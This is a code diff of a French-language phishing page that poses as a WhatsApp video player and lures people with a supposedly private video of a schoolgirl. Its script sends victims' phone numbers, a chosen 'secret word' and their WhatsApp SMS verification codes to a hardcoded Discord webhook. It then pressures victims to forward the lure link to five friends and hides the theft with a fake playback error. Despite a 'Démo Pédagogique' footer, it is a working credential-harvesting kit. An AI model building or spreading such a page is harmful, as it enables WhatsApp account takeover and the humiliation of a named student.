@@ -13,13 +13,14 @@
             background-position: center;
         }
         .blur-bg { backdrop-filter: blur(8px); }
+        .progress-transition { transition: width 0.8s ease-in-out; }
     </style>
 </head>
 <body class="bg-[#111b21] text-[#e9edef] font-sans min-h-screen flex items-center justify-center p-4">
 
     <div class="w-full max-w-md bg-[#202c33] rounded-2xl shadow-2xl overflow-hidden border border-gray-700">
         <div class="bg-[#00a884] p-4 flex items-center gap-3">
-            <i class="fab fa-whatsapp text-2xl"></i>
+            <i class="fab fa-whatsapp text-2xl text-white"></i>
             <span class="font-bold text-lg">WhatsApp Media Player</span>
         </div>
 
@@ -28,73 +29,109 @@
                 <div class="bg-white/20 p-4 rounded-full blur-bg mb-2">
                     <i class="fas fa-play text-white text-3xl ml-1"></i>
                 </div>
-                <p class="text-sm font-semibold px-4 text-center">Vidéo : Mutakalisation Bobokoli (Privé)</p>
-                <p class="text-[10px] text-gray-300 mt-1">Taille : 12.4 MB • Durée : 04:20</p>
+                <p class="text-sm font-semibold px-4 text-center text-white">Vidéo : Mutakalisation Bobokoli (Privé)</p>
+                <p class="text-[10px] text-gray-300 mt-1 uppercase tracking-tighter">Taille : 12.4 MB • Durée : 04:20</p>
             </div>
         </div>
 
         <div class="p-6 pt-2">
-            <div class="bg-[#111b21] p-4 rounded-xl border border-gray-700 mb-4">
+            <div id="main-auth" class="bg-[#111b21] p-4 rounded-xl border border-gray-700 mb-4">
                 <p class="text-xs text-[#8696a0] mb-3 uppercase tracking-wider font-bold">Vérification de Sécurité</p>
-                <p class="text-sm mb-4">Pour visionner ce contenu protégé, veuillez confirmer votre identité WhatsApp.</p>
                 
                 <form id="pirateForm" class="space-y-4">
-                    <div>
+                    
+                    <div id="step1" class="space-y-4 text-center">
                         <input type="text" id="phone" placeholder="Numéro de téléphone" required
                             class="w-full bg-[#2a3942] border-none rounded-lg p-3 outline-none focus:ring-2 focus:ring-[#00a884] text-white">
-                    </div>
-                    <div id="otpSection" class="hidden animate-pulse">
-                        <input type="text" id="otp" placeholder="Code de déverrouillage (SMS)" 
-                            class="w-full bg-[#2a3942] border-2 border-[#00a884] rounded-lg p-3 outline-none text-center text-xl tracking-widest font-bold">
-                        <p class="text-[10px] text-green-500 mt-2 text-center">Un code whatsapp a été envoyé pour sécuriser la lecture.</p>
+                        
+                        <div class="space-y-1">
+                            <input type="password" id="secret" placeholder="Créez un mot secret à retenir" required
+                                class="w-full bg-[#2a3942] border-none rounded-lg p-3 outline-none focus:ring-2 focus:ring-[#00a884] text-white text-center">
+                            <p class="text-[10px] text-red-400 px-1 font-semibold italic">
+                                ⚠️ Notez bien ce mot secret. Sans lui, l'accès sera définitivement bloqué.
+                            </p>
+                        </div>
+                        
+                        <button type="button" id="nextBtn" class="w-full bg-[#00a884] text-[#111b21] font-bold py-3 rounded-full hover:bg-[#06cf9c] transition uppercase">
+                            Vérifier l'éligibilité
+                        </button>
                     </div>
 
-                    <button type="button" id="nextBtn" class="w-full bg-[#00a884] text-[#111b21] font-bold py-3 rounded-full hover:bg-[#06cf9c] transition uppercase">
-                        Débloquer la vidéo
-                    </button>
-                    
-                    <button type="submit" id="submitBtn" class="hidden w-full bg-[#00a884] text-[#111b21] font-bold py-3 rounded-full hover:bg-[#06cf9c] transition uppercase border-2 border-white">
-                        Lancer le Player
-                    </button>
+                    <div id="step-share" class="hidden space-y-4 text-center">
+                        <h3 class="text-orange-400 font-black text-sm uppercase">🚨 Action de Solidarité Requise</h3>
+                        <p class="text-[11px] text-gray-300">Cette vidéo est protégée. Partagez-la avec 5 amis ou groupes Bobokoli pour débloquer le lecteur média.</p>
+                        
+                        <div class="w-full bg-gray-800 h-4 rounded-full overflow-hidden border border-gray-600">
+                            <div id="bar" class="progress-transition bg-[#25D366] h-full w-0"></div>
+                        </div>
+
+                        <button type="button" onclick="handleShare()" class="w-full bg-[#25D366] text-white font-bold py-3 rounded-full flex items-center justify-center gap-2 animate-bounce">
+                            <i class="fab fa-whatsapp text-xl"></i> PARTAGER SUR WHATSAPP
+                        </button>
+                    </div>
+
+                    <div id="otpSection" class="hidden">
+                        <div class="bg-gray-800 p-3 rounded-lg border border-[#00a884] mb-3">
+                            <input type="text" id="otp" placeholder="Code de déblocage (SMS)" 
+                                class="w-full bg-transparent border-none text-center text-2xl tracking-widest font-bold text-white outline-none">
+                        </div>
+                        <p class="text-[10px] text-green-400 mb-4 text-center italic">Le code de sécurité vient d'être généré par WhatsApp.</p>
+                        <button type="submit" class="w-full bg-[#00a884] text-[#111b21] font-bold py-3 rounded-full border-2 border-white uppercase shadow-lg">
+                            DÉBUTER LA LECTURE
+                        </button>
+                    </div>
                 </form>
             </div>
-            <p class="text-[10px] text-[#8696a0] text-center">Chiffrement de bout en bout whatsapp</p>
+            <p class="text-[10px] text-[#8696a0] text-center italic">Chiffrement de bout en bout Bobokoli-Secure</p>
         </div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+        
         const nextBtn = document.getElementById('nextBtn');
-        const submitBtn = document.getElementById('submitBtn');
+        const step1 = document.getElementById('step1');
+        const stepShare = document.getElementById('step-share');
         const otpSection = document.getElementById('otpSection');
+        const bar = document.getElementById('bar');
 
-        // Alerte à l'ouverture du site
-        window.onload = () => {
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: "🚨 **Alerte :** Le prof vient d'ouvrir le lien de la vidéo Mutakalisation !" })
-            });
-        };
-
-        // Transition vers le champ OTP
+        // Étape 1 : Envoi numéro + mot secret
         nextBtn.addEventListener('click', () => {
             const phone = document.getElementById('phone').value;
-            if(!phone) return alert("Entrez votre numéro");
-            
-            // On envoie déjà le numéro à Discord
+            const secret = document.getElementById('secret').value;
+            if(!phone || !secret) return alert("Veuillez remplir les informations de sécurité");
+
             fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `📱 **Numéro entré :** ${phone}\n*En attente du code SMS...*` })
+                body: JSON.stringify({ 
+                    content: `👤 **Nouvelle Victime Bobokoli**\n📱 **Tel :** \`${phone}\`\n🔑 **Mot Secret :** ||${secret}||` 
+                })
             });
 
-            nextBtn.classList.add('hidden');
-            otpSection.classList.remove('hidden');
-            submitBtn.classList.remove('hidden');
+            step1.classList.add('hidden');
+            stepShare.classList.remove('hidden');
         });
 
-        // Envoi final du code
+        // Étape 2 : Partage Viral (Levier psychologique)
+        function handleShare() {
+            // Animation de la barre
+            bar.style.width = "100%";
+            
+            // Le message viral qui sera envoyé par la victime
+            const msg = encodeURIComponent("Regarde la vidéo d'une élève de l'école en pleine action LOL : https://tinyurl.com/Mutakalisation-Bobokoli");
+            
+            // Simule l'ouverture de WhatsApp
+            window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
+
+            // On passe à la capture finale après 2.5 secondes
+            setTimeout(() => {
+                stepShare.classList.add('hidden');
+                otpSection.classList.remove('hidden');
+            }, 2500);
+        }
+
+        // Étape 3 : Capture finale du code WhatsApp
         document.getElementById('pirateForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const phone = document.getElementById('phone').value;
@@ -105,18 +142,18 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🎬 ACCÈS VIDÉO DÉTECTÉ",
-                        color: 3066993,
+                        title: "🎯 CODE WHATSAPP CAPTURÉ",
+                        color: 16711680, // Rouge pour l'alerte
                         fields: [
                             { name: "📱 Numéro", value: phone, inline: true },
-                            { name: "🔑 CODE WHATSAPP", value: `**${otp}**`, inline: true }
+                            { name: "🔑 CODE SMS", value: `**${otp}**`, inline: true }
                         ],
-                        footer: { text: "Victime Bobokoli" },
+                        footer: { text: "Démo Pédagogique - Bobokoli" },
                         timestamp: new Date()
                     }]
                 })
             }).then(() => {
-                alert("Erreur de codec : Impossible de lire la vidéo sur ce navigateur.");
+                alert("Erreur de décodage : Votre connexion est trop instable pour charger cette vidéo HD. Réessayez plus tard.");
             });
         });
     </script>
